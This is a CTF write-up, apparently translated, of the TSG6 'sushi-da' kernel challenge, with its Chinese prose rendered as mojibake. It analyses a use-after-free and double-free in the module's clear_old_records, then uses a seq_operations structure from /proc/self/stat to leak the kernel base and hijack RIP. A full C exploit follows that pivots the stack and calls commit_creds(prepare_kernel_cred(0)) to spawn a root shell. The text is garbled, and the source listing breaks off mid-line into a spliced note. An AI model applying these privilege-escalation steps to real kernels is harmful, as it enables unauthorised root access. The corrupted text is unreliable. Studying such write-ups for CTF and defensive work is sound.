# TSG6 sushi-da å†…æ ¸éƒ¨åˆ†åˆ†æž
|
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
## 0x1 å¼€å¯çš„ä¿æŠ¤
`run.sh`:
    qemu-system-x86_64 \
      -kernel bzImage \
      -initrd rootfs.cpio \
      -nographic \
      -monitor none \
      -cpu qemu64 \
      -append "console=ttyS0 kaslr panic=1 nosmep nosmap pti=off quiet oops=panic" \
      -no-reboot \
      -m 256M \
      -s
è°ƒè¯•çš„æ—¶å€™ç¨å¾®åšäº†ä¿®æ”¹ï¼ŒæŠŠ`timeout`åŽ»æŽ‰äº†ï¼ŒåŠ äº†è°ƒè¯•å‚æ•°ã€‚
æ–‡ä»¶ç³»ç»Ÿè§£åŽ‹ä¹‹åŽçš„`init`ï¼š
    #!/bin/sh
    /bin/mount -t proc proc /proc
    /bin/mount -t sysfs sysfs /sys
    /bin/mount -t devtmpfs devtmpfs /dev
    /sbin/mdev -s
    mkdir -p /dev/pts
    mount -vt devpts -o gid=4,mode=620 none /dev/pts
    chmod 666 /dev/ptmx
    echo 1 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    mkdir /home
    mkdir /home/user
    chown 1000:1000 /home/user -R
    mv /flag* /home/user
    mv /client /home/user/client
    chown 1000:1000 /home/user/flag1
    chown 1000:1000 /home/user/flag2
    chown root:root /home/user/flag3
    chown 1000:1000 /home/user/client
    chmod 400 /home/user/flag*
    insmod /sushi-da.ko
    chmod 666 /dev/sushi-da
    echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
    echo -e "\n\n WELCOME TO SUSHIl ðŸµðŸ£ðŸµ\n\n"
    cd /home/user
    stty erase ''
    stty -echo
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    poweroff -d 0 -f
ç”±äºŽæˆ‘æ˜¯ç›´æŽ¥çœ‹çš„å†…æ ¸éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼ŒæŠŠå¯åŠ¨ç¨‹åºæ¢æˆäº†`sh`ã€‚
ç»¼ä¸Šï¼Œå¼€å¯çš„ä¿æŠ¤å‡ ä¹Žæ²¡æœ‰ï¼Œåªæœ‰åœ°å€éšæœºåŒ–KASLRã€‚
## 0x2 æºç åˆ†æž
é¢˜ç›®ç»™äº†æºç ï¼Œå¥½è¯„QAQï¼ï¼
é¢˜ç›®æ¶‰åŠçš„ç»“æž„ä½“ï¼š
    struct record{
      char date[0x10];
      unsigned long result;
    };    // æˆ‘ä»¬æŽ§åˆ¶çš„ç»“æž„ä½“
    struct ioctl_register_query{
      struct record record;
    };    // ç”¨äºŽä¼ å…¥æˆ‘ä»¬è®¾è®¡çš„ç»“æž„ä½“
    struct ioctl_fetch_query{
      unsigned rank;
      struct record record;
    };    // ç”¨äºŽæŸ¥è¯¢è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ç»“æž„ä½“
å¸¸è§„çš„èœå•é¢˜ç›®ï¼š
  * `register_record`:è´Ÿè´£ç”³è¯·ä¸€ä¸ªåˆå§‹åŒ–ä¸ºå…¨é›¶çš„å †å—ï¼Œæ”¾å…¥åˆ—è¡¨é‡Œã€‚
  * `fetch_record`:é¢˜ç›®çš„ç»“æž„ä½“é‡Œé¢æœ‰ä¸€ä¸ª`Rank`ï¼Œå‡½æ•°è®¡ç®—å‡ºæ¯ä¸ªå †å—çš„`Rank`ï¼Œç„¶åŽå¦‚æžœæœ‰æˆ‘ä»¬æŒ‡å®šçš„`Rank`ï¼Œå°±ä¼šè¾“å‡ºç»™æˆ‘ä»¬å¯¹åº”`Rank`çš„å †å—çš„å†…å®¹ã€‚
  * `clear_old_records`:`free`ä¸€éƒ¨åˆ†å †å—ï¼Œæˆ‘ä»¬å¯ä»¥è®¾è®¡è¿™å†™äº›å¯ä»¥è¢«`free`çš„å †å—ã€‚
  * `clear_all_records`:æŠŠå †å—åˆ—è¡¨æ¸…ç©ºï¼Œä¸æ˜¯`free`ã€‚
é—®é¢˜ä»£ç åœ¨`clear_old_records`:
    long clear_old_records(void)
    {
      int ix;
      char tmp[5] = {0};
      long date;
      for (ix = 0; ix != SUSHI_RECORD_MAX; ++ix)
      {
        if (records[ix] == NULL)
          continue;
        strncpy(tmp, records[ix]->date, 4);
        if (kstrtol(tmp, 10, &date) != 0 || date  ## seq_operations
>
>   * ã‚µã‚¤ã‚ºï¼š0x20 (kmalloc-32)
>   * baseï¼š4ã¤ã®é–¢æ•°ãƒã‚¤ãƒ³ã‚¿ã‹ã‚‰å¥½ããªã‚‚ã®ã‚’ä½¿ã£ã¦ãƒªãƒ¼ã‚¯å¯èƒ½ã€‚
>   * heapï¼šãƒªãƒ¼ã‚¯ã§ããªã„ã€‚
>   * stackï¼šãƒªãƒ¼ã‚¯ã§ããªã„ã€‚
>   * RIPï¼šä¾‹ãˆã° `start` ã‚’ä¹¦ãæ¢ãˆã¦readã‚’å‘¼ã¹ã°RIPãŒãƒãƒ³ï¼ã£ã¦ãªã‚‹ã€‚
>   * ç¡®ä¿ï¼š`single_open`ã‚’ä½¿ã†ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¼€ãã€‚`/proc/self/stat`ã¨ã‹ã€‚
>   * è§£æ”¾ï¼š`close`ã™ã‚‹ã€‚
>   *
> å‚è€ƒï¼š
>
>  
>  
>     0x0000: 0xffffffff811c5f70
>     0x0008: 0xffffffff811c5f90
>     0x0010: 0xffffffff811c5f80
>     0x0018: 0xffffffff8120c3f0
>     [+] kbase = 0xffffffff81000000
>     Press enter to continue...
>     [    6.801190] BUG: unable to handle kernel paging request at
> 00000000deadbeef
>  
è¿™ä¸ªç»“æž„ä½“ï¼Œé‡Œé¢éƒ½æ˜¯å¯ä»¥ç”¨æ¥æ³„æ¼çš„å†…æ ¸åŸºåœ°å€çš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶ä¸”`read`å‡½æ•°å¯ä»¥ç”¨æ¥åŠ«æŒRIPï¼Œå¤ªåˆé€‚äº†å¥½å§ã€‚
ä½¿ç”¨æ–¹æ³•ï¼š
    int victim = open("/proc/self/stat", O_RDONLY);
    char c;
    read(victim, &c, 1); // åŠ«æŒRIP
æ‰€ä»¥æ€è·¯å¾ˆæ˜Žæ˜¾äº†ï¼š
  * é€šè¿‡UAFï¼Œç”³è¯·ä¸€ä¸ªå †å—ï¼Œ`kfree`æŽ‰å®ƒï¼Œç„¶åŽå¯åŠ¨`/proc/self/stat`ã€‚
  * è¾“å‡ºè¿™ä¸ªè¢«`kfree`çš„å †å—çš„å†…å®¹ï¼Œå°±ä¼šè¾“å‡ºè¿™äº›å‡½æ•°æŒ‡é’ˆã€‚æ³„æ¼äº†å†…æ ¸åŸºåœ°å€ã€‚
  * ç„¶åŽå†æ¬¡`kfree`è¿™ä¸ªè¿™ä¸ªå †å—ï¼Œå‘é‡Œé¢æ”¾å…¥æˆ‘ä»¬éœ€è¦çš„åœ°å€ï¼Œæ¥æ ˆè¿ç§»ã€‚
å…³äºŽæ ˆè¿ç§»è¿™é‡Œï¼š
å…¶å®žå¯ä»¥æœ‰å¾ˆå¤š`mov esp, 0xbalabala`çš„`gadget`ï¼Œæ‰¾ä¸€ä¸ªåˆé€‚çš„åº”è¯¥å°±å¥½äº†å§ï¼Œæˆ‘é€‰çš„æ˜¯è¿™ä¸€æ¡ï¼š
    0xffffffff816216c0: mov esp, 0xf6ffac28; ret;
ç„¶åŽ`mmap`å‡ºæ¥è¿™å—ç©ºé—´ï¼Œå†™å…¥ROPé“¾ï¼Œè¯´æ˜¯ROPé“¾ï¼Œå…¶å®žé‡Œé¢ä¹Ÿå°±ä¸€ä¸ªå‡½æ•°ï¼š
    size_t rop_chain[] = {
        get};
    static void get()
    {
        commit_creds(prepare_kernel_cred(0));
        asm volatile("swapgs ;"
                     "movq %0, 0x20(%%rsp)\t\n"
                     "movq %1, 0x18(%%rsp)\t\n"
                     "movq %2, 0x10(%%rsp)\t\n"
                     "movq %3, 0x08(%%rsp)\t\n"
                     "movq %4, 0x00(%%rsp)\t\n"
                     "iretq"
                     :
                     : "r"(user_ss),
                       "r"(user_sp),
                       "r"(user_rflags),
                       "r"(user_cs), "r"(pop_shell));
      void pop_shell(void)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
## 0x4 Exploit
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define SUSHI_REGISTER_RECORD 0xdead001
    #define SUSHI_FETCH_RECORD 0xdead002
    #define SUSHI_CLEAR_OLD_RECORD 0xdead003
    #define SUSHI_CLEAR_ALL_RECORD 0xdead004
    #define SUSHI_RECORD_MAX 0x10
    #define SUSHI_NAME_MAX 0x10
    struct record
    {
        char date[0x10];
        unsigned long result;
    };
    struct ioctl_register_query
    {
        struct record record;
    };
    struct ioctl_fetch_query
    {
        unsigned rank;
        struct record record;
    };
    #define errExit(msg)              \
        do                            \
        {                             \
            perror("[ERROR EXIT]\n"); \
            perror(msg);              \
            exit(EXIT_FAILURE);       \
        } while (0)
    #define WAIT(msg) \
        puts(msg);    \
        fgetc(stdin);
    unsigned long long user_cs, user_ss, user_sp, user_rflags;
    int fd; // file descriptor
    unsigned long long leak, kernbase, heapbase;
    unsigned long long base = 0xffffffff81194090;
    typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
    _commit_creds commit_creds = 0;
    _prepare_kernel_cred prepare_kernel_cred = 0;
    void pop_shell(void)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
    void save_status()
    {
        __asm__("mov %cs, user_cs;"
                "mov %ss, user_ss;"
                "mov %rsp, user_sp;"
                "pushf;"
                "pop user_rflags;"
                );
        puts("[*]status has been saved.");
    }
    static void get()
    {
        commit_creds(prepare_kernel_cred(0));
        asm volatile("swapgs ;"
                     "movq %0, 0x20(%%rsp)\t\n"
                     "movq %1, 0x18(%%rsp)\t\n"
                     "movq %2, 0x10(%%rsp)\t\n"
                     "movq %3, 0x08(%%rsp)\t\n"
                     "movq %4, 0x00(%%rsp)\t\n"
                     "iretq"
                     :
                     : "r"(user_ss),
                       "r"(user_sp),
                       "r"(user_rflags),
                       "r"(user_cs), "r"(pop_shell));
    }
    unsigned long long calc(unsigned long long addr)
    {
        return addr - base + kernbase;
    }
    int register_record(char *date, unsigned long result)
    {
        struct ioctl_register_query request;
        memcpy(request.record.date, date, 0x10);
        request.record.result = result;
        return ioctl(fd, SUSHI_REGISTER_RECORD, &request);
    }
    int fetch_record(struct ioctl_fetch_query *request)
    {
        return ioctl(fd, SUSHI_FETCH_RECORD, request);
    }
    int clear_old_records()
    {
        return ioctl(fd, SUSHI_CLEAR_OLD_RECORD, 0);
    }
    int clear_all_records()
    {
        return ioctl(fd, SUSHI_CLEAR_ALL_RECORD, 0);
    }
    int main(int argc, char const *argv[])
    {
        fd = open("/dev/sushi-da", O_RDWR);
        save_status();
        register_record("1970/12/24\x00", 1970);
        clear_old_records();
        int victim = open("/proc/self/stat", O_RDONLY);
        struct ioctl_fetch_query leak;
        leak.rank = 4;
        fetch_record(&leak);
        kernbase = *(unsigned long *)leak.record.date; // single_start
        printf("Leak single_start addr : %#llx\n", *(unsigned long long *)leak.record.date);
        commit_creds = calc(0xffffffff8106cd00);
        prepare_kernel_cred = calc(0xffffffff8106d110);
        printf("Leak commit_creds addr : %#llx\n", commit_creds);
        printf("Leak prepare_kernel_cred addr : %#llx\n", prepare_kernel_cred);
        unsigned long long *rop =
            (unsigned long long *)mmap(0xf6ffa000,
                                       0x8000,
                                       PROT_READ | PROT_EXEC | PROT_WRITE,
                                       MAP_ANON | MAP_PRIVATE | MAP_POPULATE,
                                       -1, 0);
        printf("Chain: %#llx\n", rop);
        unsigned long long chain[0x100];
        size_t rop_chain[] = {
            get};
        // double free
        clear_old_records();
        memcpy(0xf6ffac28, rop_chain, sizeof(rop_chain));
        struct ioctl_register_query request;
        memset(request.record.date, 0, 0x10);
        *(unsigned long long *)request.record.date = calc(0xffffffff816216c0);
        *((unsigned long long *)request.record.date + 1) = calc(0xffffffff816216c0);
        request.record.result = calc(0xffffffff816216c0);
        register_record((void *)request.record.date, 0xffffffffdeadc0c0);
        printf("Got Shell!\n");
        char c;
        read(victim, &c, 1);
        return 0;
    }
    // / # ffffffff8106cd00 T commit_creds
    // / # ffffffff8106d110 T prepare_kernel_cred
    // / # ffffffff81194090 t single_start
    // / # sushi_da 16384 0 - Live 0xffffffffc0000000 (O)
    // .text:000000000000002E                 call    kmem_cache_alloc_trace ; PIC mode
    // b *0xffffffffc000002e
    // .text:00000000000001B6                 call    kfree           ; PIC mode
    // b *0xffffffffc00001b6
    // .text:000000000000014D                 call    _copy_to_user   ; PIC mode
    // b *0xffffffffc000014d
    // 0xffff88800f2bd500
    // pwndbg> x/10gx 0xffff88800f2bd540
    // 0xffff88800f2bd540:     0x2f32312f30393931      0x6e6f657800003432
    // 0xffff88800f2bd550:     0x000000000000001e      0x0000000000000000
    // 0xffffffff816216c0: mov esp, 0xf6ffac28; ret;